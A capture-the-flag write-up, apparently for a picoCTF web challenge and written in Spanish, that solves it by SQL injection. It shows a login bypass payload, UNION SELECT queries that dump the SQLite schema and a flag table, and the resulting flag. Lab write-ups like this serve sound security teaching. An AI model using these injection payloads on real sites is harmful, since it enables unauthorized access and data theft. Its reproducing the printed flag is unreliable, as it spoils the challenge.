## Descripción
Can you find the flag on this website.Try to find the flag [here](http://saturn.picoctf.net:59941/).
## Pistas
SQLiLite
## Solución 1
1. Primero probamos las credenciales `admin, admin`
2. Vemos que nos arroja la consulta SQL utilizada
```sql
username: admin
password: admin
SQL query: SELECT id FROM users WHERE password = 'admin' AND username = 'admin'
```
3. Construimos una consulta que siempre devuelva verdadero, haciendo la inyección en el campo de contraseña.
```sql
username: admin
password: admin' OR 1=1;
SQL query: SELECT id FROM users WHERE password = 'admin'' OR 1=1; AND username = 'admin'
```
4. Nos da acceso, podemos ver que hay un campo de busqueda, por lo que podemos intentar para ver si la inyección se realiza
`' UNION SELECT 1,2,3;`
5. Vemos que la inyección se realiza, asi que podemos buscar en las demás tablas del esquema
`' UNION SELECT 1,2,sql FROM sqlite_master;`
```sql
CREATE TABLE hints (id INTEGER NOT NULL PRIMARY KEY, info TEXT)
CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)
CREATE TABLE offices (id INTEGER NOT NULL PRIMARY KEY, city TEXT, address TEXT, phone TEXT)
CREATE TABLE users (name TEXT NOT NULL PRIMARY KEY, password TEXT, id INTEGER)
```
6. Podemos acceder a la tabla `more_table`, que tiene una columna llamada `flag`.
`' UNION SELECT 1,2,flag FROM more_table;`
7. Obtenemos la bandera `picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_c8b7cc2a}`


`picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_c8b7cc2a}`
## Notas adicionales

## Referencias
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md